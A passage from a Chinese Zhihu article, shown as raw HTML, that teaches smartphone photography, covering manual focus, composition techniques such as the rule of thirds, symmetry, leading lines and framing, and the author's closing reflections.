的焦外风格。我自己是非常喜欢在人像模式中选择这种模式，因为这种焦外会有一种很独特的柔美感，特别适合一种温柔调性的人像拍摄。以前这种效果在 iPhone 上需要软件来实现，但是现在安卓手机厂商也注意到了这种独特美学，开始内置在相机之中。</p>\n<h3>手动控制对焦</h3>\n<p>说了效果以后，我们就要说说具体的操作。其实对于手机摄影来说，对焦操作是非常简单的，和曝光一样，我们可以：</p>\n<p><b>想要哪里清晰，就点哪里。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2386\" data-rawheight=\"3181\" class=\"origin_image zh-lightbox-thumb\" width=\"2386\" data-original=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_r.jpg\"></figure><p>而所谓的这个清晰，就是我们所说的把画面中的内容放置到景深范围里。不过虽然很多时候自动对焦反应已经足够迅速，但是还是会出现难对焦的情况，尤其是在一些弱光环境下。所以此时我们就可以选择手动对焦，而手动对焦的按钮就在专业模式里。</p>\n<p>只要我们点击专业模式的「AF」，就可以对焦模式进行切换。</p>\n<ul>\n<li>AF：自动对焦</li>\n<li>MF：手动对焦</li>\n</ul>\n<p>开启手动对焦以后，我们就可以通过画面滑杆调整画面中的清晰范围。最左侧就是最小对焦距离，而最右侧就是无限远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_r.jpg\"></figure><p>最好的一个实际使用场景案例就是在夜景星空拍摄中。由于夜空弱光，手机很难曝光，所以我们就可以直接手动调整曝光到右侧无限远按下快门即可，免去了「拉风箱」的对焦过程。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_r.jpg\"></figure><p>当然，手动对焦的意义远不止于如此。手动对焦的出现可以让我们自如控制画面中的虚实。因为并不是只有「清晰锐利的照片才是好照片」。其实反而有些照片中，模糊带来的朦胧美更是有一番滋味。比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3948\" data-rawheight=\"2961\" class=\"origin_image zh-lightbox-thumb\" width=\"3948\" data-original=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_r.jpg\"></figure><p>而想要拍摄这样的效果，就需要我们更改观察的方式，可以在不同的场景中，更换照片中的虚实试一试，也许会有完全不同的发现。</p>\n<p>其实这也是摄影学习给予我一个非常重要的经验。没有任何事物是绝对的，尤其是对于艺术表达来说更是如此。并不是正确的曝光就是美的曝光，并不是清晰的对焦就是美的对焦。</p>\n<p>很多时候，它会恰恰相反，尝试换一个角度思考记录，会是一个不一样的视界。</p>\n<h2>06. 构图的美</h2>\n<p>构图是这篇文章最后一个章节了，而显然这也会是整篇文章中最为艰难的一个章节，因为它真的非常抽象。之前的章节，至少每一项内容我们的手机中都会有对应的功能，也就是会有对应的抓手，让你可以操作。</p>\n<p>而这一章节的构图，却是只有靠自己的想象力实践。</p>\n<p>但是在构图之前，我特别想要问问你，你是否了解构图的真正含义。我之所以会提出这样的问题，是因为我发现对于构图很多人竟然仅仅是停留在「形式美」。大多数人只是粗浅的在潜意识里有一个印象，「这样的构图是好看的」。但是至于为什么会好看，则全然不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_r.jpg\"></figure><p>比如，构图最为经典的三分法，今天已经是人尽皆知，但是三分法为什么是一种有效的构图方式却很难描述。这其实是很多人构图学习的重要误区。因为这会带来一个许多入门摄影师常见的问题：</p>\n<p>「我这种构图对不对？」</p>\n<p>其实这个问题的答案已经不重要，而是只要你问出这个问题，就说明你并没有真正的了解构图。因此，我现在希望你做一件事，这就是忘记所有你在社交网络上学习的所谓「构图法则」。尤其是那些几分钟让你学构图的内容，我恳请你先放下构图的包袱，我们先来回到一个最基本的问题：</p>\n<p>「什么是好照片？」</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_r.jpg\"></figure><p>我们总是希望拍摄好照片，但却没有花时间去总结。其实随着你照片的阅读量逐渐提升，好照片其实都是有着很明确的共性，而如果你可以真正抓住这种共性，那你会发现自己的摄影水平似乎在一夜之间提高了。不过我也知道，你可能会说千人千面，每个人看待照片的感受不同。你可能说它颜色好，你可能说它光线好等等等。但这些都不是本质，其实真正的本质，早就已经写在教科书上了。</p>\n<p>在可能是全球最为流行的摄影教程书籍《纽约摄影学院》中，在书籍的开篇第一章就已经总结了一张好照片的三个要素，时至今日，我依然对这三句话牢记在心：</p>\n<ol>\n<li>一幅好照片要有一个鲜明的主题（有时也被称之为题材）。</li>\n<li>一幅好照片必须能把注意力引向被摄体；</li>\n<li>一幅好照片必须简洁。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_r.jpg\"></figure><p>你会发现，仅仅是短短的几十字，却精准描述了好照片的定义。你现在可以回想任何一张你心里的好照片，是不是都满足这三个要素。</p>\n<p>我们现在逐条回顾这三个要素：</p>\n<p>首先要有一个鲜明的主题，或者是其实也可以是主体。归根到底，就是在说你的这张照片本身至少要聚焦在「一件事、一个人、一个物品」上。这是我们在拍摄之前一定要做的思考。我经常看到很多人拍了很多照片，但是却不知道自己在拍什么。一个很重要的考察方式就是，你现在可以翻看一些照片，看看其中照片哪些你能明确的回想起自己在拍摄什么，而哪些即使现在的你自己也完全不知道拍摄的是什么。</p>\n<p>所以，每次按下快门，一定要问问自己，我在拍什么。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_r.jpg\"></figure><p>而确定了拍什么以后，我们就要清楚「怎么拍」。第二句话已经给出了非常明显的答案：</p>\n<p><b>「引导注意力」。</b></p>\n<p>而这 5 个字，就是构图的意义，或者是说就是构图的根本目的。我们可以随便列举一种构图方式，比如我们刚刚所说的三分法。为什么我们要把人物放置在画面中的三分之一处，这是因为有数据显示，当我们观看照片时，我们的视觉第一落点往往是三分之一附近。</p>\n<p>也就是说，三分法的最终目的是寻找你注意力的第一落点。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_r.jpg\"></figure><p>而第三句话，一幅好照片必须简洁，本质要做的也是「不要分散注意力」。</p>\n<p>到这里，我们发现一张好照片的三要素中，有两个都是主要由构图来完成。这也在某种意义上，证明的构图的重要性。而归根到底，所谓的构图，就是让照片的阅读者看到你想要传达的「主题」。</p>\n<p>所以你现在应该知道「我这个构图对不对」错在哪里了，因为对于任何一张照片，只要是能够做到上述两条的选择都是合适的构图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_r.jpg\"></figure><p>「引导注意力」说起来简单，但是想要实践起来却是难度极高。而构图这件事几乎是所有摄影在使用整个摄影生涯为之实践和不断探索。甚至是，它奠定了很多著名摄影师的风格。不过别担心，好在构图上手也非常简单，只要你能读到这里，并且循序渐进地实践，有明显进步并不难。</p>\n<p>不过在具体开始构图法则开始之前，我依然想要特别强调，不要死记硬背，要尝试从底层的逻辑去了解。</p>\n<h3>基础构图</h3>\n<p>所谓的基础构图本质，就是画面中元素的摆放。想象一下，我们的照片无非就是一个二维形状的空间筛选。比如下面这张图中，白色的范围就是画面的取景范围。而基础构图就是把画面中的元素安排在这个区域内。比如我们现在有一个人物，就叫他张三吧，它的大致形状可以抽象为一个圆形和连接一个长方形。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_r.jpg\"></figure><p>那么我们拍摄张三时，构图就是安排他在画面中的内容。比如我们可以只让张三露出一个头：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_r.jpg\"></figure><p>一般来说，显然如果这是张三男朋友拍摄的照片，张三的男朋友肯定已经被「狂徒」制裁了。</p>\n<p>所以其实不真正拍照你也可以练习构图，因为你现在就可以直接给张三想出很多构图，比如：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_r.jpg\"></figure><p>而这种构图方式，就是要学的基础构图，归根到底，就是主体的摆放。而以下提到的方式，无非就是摆放的规则。</p>\n<p><b>三分法</b></p>\n<p>这绝对是最为流行的构图方式，流行到，今天几乎甚至是在一些景区里大多数游客都已经知道：</p>\n<p>「拍照不要站中间，要往一侧站一点。」</p>\n<p>这种构图方式其实已经越来越被熟知。在前面的设置环节中，我提到了一定要打开网格线，因为网格线本身就是帮你划好的三分线。而在这个划好的三分线上，我们可以看到画面中一共「四根线」和「四个点」。</p>\n<p>所以，只要把画面按照这样的风格方式摆布，就是最直接的构图。</p>\n<p>比如我们直接把张三放到右侧的线一侧，同时把张三的眼睛放在右上侧的交点上，这样就完成了一个最为简单直接的构图方式。这样的构图方式在人像摄影中比比皆是，比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_r.jpg\"></figure><p>其实三分法并不难，难在如何快速找到三条线和焦点。比如风景摄影师中，最重要的一个选择就是天际线的摆布位置。而如果你打开了参考线，这就不是一个难题。这就是我为什么一再强调打开参考线，它真的很重要。</p>\n<p><b>黄金螺线</b></p>\n<p>黄金螺线法则其实来自于绘画，相信这条螺旋线你可能已经或多或少的看过。人们认为在这个螺旋风分割线上的人或者物，更能被视觉看到，或者说看起来更美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2778\" data-rawheight=\"1562\" class=\"origin_image zh-lightbox-thumb\" width=\"2778\" data-original=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_r.jpg\"></figure><p>不过需要说明的是，黄金螺旋线并不是所有的构图比例都适用。归根到底，它是在构图比例为 16:9 的画幅中才是最正确的计算结果。所以想要使用黄金螺旋线构图，最好先选择画面的内容是 16:9。不过日常生活中，很难严谨，其实大致归结为三分法也基本不差。</p>\n<p><b>居中构图</b></p>\n<p>三分法的熟知，可能让我们反而忽视了居中构图。</p>\n<p>比如我们再次请出张三，我们可以看到如果我们把它放到画面中央，虽然整个画面很呆板，并不灵活。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_r.jpg\"></figure><p>但是它有一个非常重要的特征：</p>\n<p>端庄，正式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_r.jpg\"></figure><p>而这也是居中构图的最大好处。</p>\n<p>因此在一些非常严肃的人像摄影中，居中法几乎就是最好的选择。所以这也恰恰说明了一个道理，任何一个构图方式之间并没有本质的优劣或者是高级。而是需要拍摄者，需要根据题材进行一个非常主动的选择。所以并不是居中构图不好，只是它需要合适的场景。</p>\n<p><b>对称构图</b></p>\n<p>对称构图基本上最常见的有两种构图分支，一个是：</p>\n<p><b>1. 镜面构图</b></p>\n<p>利用生活中，一切可以出现的镜面，并利用场景的反射往往可以拍摄非常多有趣的画面。而且其实除了常规的镜子以外，有很多生活中随处可得的简单物品都可以是合适的镜面，比如我们的手机屏幕就是。把一台手机的屏幕放置在手机镜头的底部附近，你就会发现一个纯天然的镜面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_r.jpg\"></figure><p>水面也是一个非常常见的镜面构图的辅助。尤其是一些湖泊，海洋等等。只要我们在一个相对来说比较合适的光线场景，我们都可以让天空中的景色映入水幕。而且其实这里有一个很重要的技巧，一些场景中，如果本身没有水面我们也可以制造水面，比如在夜晚拍摄时，如果是晴天无水的街面，可能只要稍稍一点的水倒在地面上，就可以拍摄出很不错的镜面灯光反射。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_r.jpg\"></figure><p>这其中一个最为重要的技巧就是手机镜头一定要低，尽可能的接近地面。</p>\n<p>而这也解释了为什么雨天拍照反而效果更好，因为下雨以后地面上会有很多水面，这些水面镜像出来的光线会让画面更加丰富有趣。</p>\n<p><b> 2. 元素构图</b></p>\n<p>元素对称并没有镜面对称这么直接，因为镜面对称是光线的基本原理，是肉眼可见的。而接下来的元素对称则需要一点想象力。比如我们再次请回我们的张三同学，在下面的画面中，我们可以看到张三同学站在画面的一侧，而另一侧又站了另一个李四同学。</p>\n<p>那么我们现在可以在张三李四之间划一条线，我们发现张三李四恰好处在对称的点上，这就是我们所说的元素对称。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_r.jpg\"></figure><p>如果要说元素对称最了不起的还是要属我最喜欢的导演之一，韦斯安德森。单单说他的名字很多人可能不熟悉，但是你一定要听说过《布达佩斯大饭店》。</p>\n<p>在这部电影里，我们随处可见类似的元素对称，比如下面的截图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_b.jpg\" data-size=\"normal\" data-rawwidth=\"5760\" data-rawheight=\"3840\" class=\"origin_image zh-lightbox-thumb\" width=\"5760\" data-original=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_r.jpg\"><figcaption>《布达佩斯大饭店》剧照</figcaption></figure><p>这样的构图方式，会让整个画面具有设计感和视觉美感。而韦斯安德森对于这种构图方式的执念，也让他拥有了属于自己的风格。</p>\n<p>而这里也给我们两个很重要的启示：</p>\n<ol>\n<li>构图方式很多，如果不知道怎么构图选择，不如先挑选一个自己喜欢的构图方式，不断尝试，届时自然相通。</li>\n<li>多看好电影其实是一种非常有效和高效的构图方式。电影中的用光和构图都经过非常细致的考量，而且相比照片不同，很多电影还要考虑动态的光影和构图，更是难上加难。所以看电影的时候，稍微观察一下，很快就能感受到进步。</li>\n</ol>\n<p><b>引导线构图</b></p>\n<p>当然对于一张摄影作品来说，很多时候画面中不仅仅有这形状，还是线。最为常见的线自然是河流或者是山川的流动。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_r.jpg\"></figure><p>而画面中只要是出现流动的线，就会对照片读者的视线有着非常直接的引导作用。所以这也引申出风光摄影另一个非常经典的公式，我管它叫做「山下的河流」。</p>\n<p>比如最经典的亚当斯的这一张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_b.jpg\" data-size=\"normal\" data-rawwidth=\"2036\" data-rawheight=\"1652\" class=\"origin_image zh-lightbox-thumb\" width=\"2036\" data-original=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_r.jpg\"><figcaption>The Tetons and the Snake River, Grand Teton National Park（安塞尔·亚当斯作品）</figcaption></figure><p>在这张中，我们的视线一开始一定会聚焦在这条河流上，然后我们会随着河流的移动方向，就可以看到远处的山脉，而其实对于这张作品而言，最终的主角正是远处的山脉。</p>\n<p>而使用线条引导画面历史上还有更为经典的一张作品，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_b.jpg\" data-size=\"normal\" data-rawwidth=\"2034\" data-rawheight=\"1366\" class=\"origin_image zh-lightbox-thumb\" width=\"2034\" data-original=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_r.jpg\"><figcaption>亨利·卡蒂埃-布列松作品</figcaption></figure><p>上图中，正是因为楼梯的引导线存在，给观众一个非常重要的错觉，会让我们觉得似乎骑自行车的人实际上是从楼梯上下来的。但无论是从哪里下来的，引导线的存在立刻就会让我们的视觉焦点停留在骑自行车的人上。所以下次，当你的画面中，出现线的时候，一定要好好加以利用，想一想，你可以让它的视线引导到哪里。</p>\n<h3>进阶构图</h3>\n<p>在进阶构图开始之前，我还是需要进行再一次的强调，「引导注意力」。因为接下来我要说的构图，无论多么抽象，多么难以理解，归根到底你要知道它的目的就是一种「注意力管理」。</p>\n<p><b>利用前景</b></p>\n<p>其实在摄影眼的部分，在超广角的部分我们已经描述过前景的作品，但是当时仅仅是局限在风光摄影。但是实际上，在各类题材中，前景都是非常好的拍摄手法。</p>\n<p>前景最为直接的作用就是简化画面，因为它的遮挡可以让画面中一些分散注意力的部分直接去除。但更重要的是，前景的构图，可以让照片从「二维」跳脱为「三维」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2995\" data-rawheight=\"3993\" class=\"origin_image zh-lightbox-thumb\" width=\"2995\" data-original=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_r.jpg\"></figure><p>因为大多数照片都是主体和背景构成，画面中只有两层。但是由于前景的出现，画面直接变为了「前、中、后」三层，具有更强的立体感。</p>\n<p><b>寻找画框</b></p>\n<p>不过要说到吸引注意力，那么我想没有任何一种构图方式比框式构图更为直接。道理也很简单，如果给你一页文字，让你在这个文字中标出重点，那么最直接有效的办法是什么呢？</p>\n<p>画个圈。</p>\n<p>是的，所谓的画框构图就有这样类似的作用，比如下面这张图，由于窗框的存在，我们可以直接可以聚焦在模特身上，而显然这就是画面的主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3133\" data-rawheight=\"2350\" class=\"origin_image zh-lightbox-thumb\" width=\"3133\" data-original=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_r.jpg\"></figure><p>更为高级的是，这种框选不仅仅是吸引注意力，它同时还能够让画面中立刻有了「画里画外」两个世界，尤其是一些在交通工具内拍摄的场景更是如此。它不仅仅在客观上明确的告诉你照片内的空间关系，同时很多时候也可以成为一种内在隐含，让人对拍摄者和窗外世界的联系有诸多遐想。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_r.jpg\"></figure><p>因此，多多观察生活中这些「已经画好的圈」。</p>\n<p><b>控制明暗</b></p>\n<p>严格意义上，明暗某种意义上来说应该算作是一种曝光的手法。但是这些年来，明暗的反差手法也的确成为了一种流行趋势。而自从彩色摄影出现以来，也的确有不少的大师以这种手法见长。</p>\n<p>在这里，所谓的明暗含义是通过画面中过度曝光，或者是过度欠曝，让画面中出现大面积的白色或者是黑色，或者是黑白两色为主。此时一般出现在画面中的人物很容易成为没有信息的剪影。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_r.jpg\"></figure><p>但这也是我认为明暗控制方式应该算作构图的原因，因为这种方式大大去掉了画面中的干扰信息，让画面十分简洁。</p>\n<p><b>传达质感</b></p>\n<p>这可能是最为抽象的构图方式，但是其实果你还对汉语中「移觉和通感」这种修辞手法有记忆，那么其实二者是完全相同的。</p>\n<p>在汉语中，所谓的移觉或通感是说：</p>\n<p>用形象的语言把人们某个感官上的感觉移植到另一个感官上，凭借感觉相通，相互映照，以收到启发读者联想、体味余韵和深化诗文意境的效果。</p>\n<p>而在摄影中，我们如何通过视觉的方式，让读者其它的感光也有所感触，就是「质感构图」的作用。</p>\n<p>比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3859\" data-rawheight=\"2894\" class=\"origin_image zh-lightbox-thumb\" width=\"3859\" data-original=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_r.jpg\"></figure><p>这是一张我们在魔鬼城里拍摄的沙地，这张图中，拍摄时摄影师一个很重要的想法就是通过寻找角度让沙子的颗粒更加明显，而这样做的目的就是当读者看到画面时，立刻能够想到自己的手对于沙子的触感。</p>\n<p>也就是说，拍照虽然是视觉艺术，但是我们是可以通过巧妙的方式，让我们的其它感官获得反馈。一个最简单直接的例子就是美食摄影中，很多飘散的烟雾就是「嗅觉的可视化」。</p>\n<p>而这就是所谓的质感构图。</p>\n<p>读到这里，相信你对构图已经有了一个重新的认识。我最后唯一还能再分享的就是我自己的构图学习历程。从我的经验来看，构图会有一个：</p>\n<p>「从无到有，然后从有到无的过程」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_r.jpg\"></figure><p>所谓从无到有，就是正在阅读本文的各位，现在你已经了解到了很多构图方式，心里已经有了构图这件事。我相信聪明的你，现在拿起手机想要拍照，第一件事就是下意识构图。</p>\n<p>但是随着时间的推移，你会发现你很少再会注意构图这件事，但是你的作品却在潜移默化中悄悄的完成构图。这就是从有到无。</p>\n<p>但这还不是结束，而我也正在处于这一阶段，这就是「演绎自己的构图」。比如韦斯·安德森的对称构图，Alex Webb 的复杂构图等等等。</p>\n<p>所以，不仅是你，包括我自己到今天都是构图学习的学生，我们一起要走的路还有很远，毕竟学习怎么会有尽头。</p>\n<h2>写在最后</h2>\n<p>我不知道，会有多少人可以读到这里。</p>\n<p>毕竟这是一篇最终定格在 30000 字的文章，匀速阅读到这里至少需要接近 100 分钟。100 分钟看似不长，仅仅是一部电影的跨度。但是人生苦短，你能拿出生命中的 100 分钟和我一起在摄影的旅程中一起冒险，我深感荣幸。</p>\n<p>所以如果你真的读到这里，我很希望你可以大方地在评论区说说你的感受，让我知道过去我两个月的努力和付出真的对你有帮助，这对我很重要，是我创作的最大动力。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3204\" data-rawheight=\"2403\" class=\"origin_image zh-lightbox-thumb\" width=\"3204\" data-original=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_r.jpg\"></figure><p>按照惯例我需要在这里感谢本篇文章付出的每一个工作人员，他们是：</p>\n<ul>\n<li>本文中大量插图的拍摄者，厉害的手机摄影师也是我的挚友 Jamie-hua</li>\n<li>本文的编辑 nerd_du</li>\n<li>我们团队的支撑力量，批预算的制片人 Irene</li>\n</ul>\n<p>当然，还有本文的每一位读者。</p>\n<p>不过我想作为一篇分享，最好的致谢是「倾其所有」。思来想去，在技术上这篇文章已经倾囊相授，我还能说给你听的，只有我在摄影学习中的教训和经验，我就用它来做为本文的结尾吧。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2044\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_r.jpg\"></figure><ol>\n<li>\n<b>没有终点。</b>当你走上摄影这条路，就意味着终生学习，不仅仅是随着时代进步的技术，还有人生的经历。最后决定你照片厚度的，不是照片的数量，而是人生的阅历。</li>\n<li>\n<b>保持谦逊。</b>无论何时都不要说「已经拍得够好了」，多去看看别人在做什么，拍什么。我深知自身能力有限，所以今日所叙，应该是你摄影的起点，而不是重点。</li>\n<li>\n<b>学会享受。</b>纠结自己拍得好不好，作为鞭策自己的动力就好。重要的是，要学会找到摄影的乐趣，希望你有一天能做到对着自己拍摄的照片说出：<b>「今天拍了这么多了，已经很好了，我很满足。」</b>\n</li>\n</ol>\n<p>好了，列车终究要到站，期待在摄影学习的路上，与各位再会。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bigface-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Derrick Zhang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a 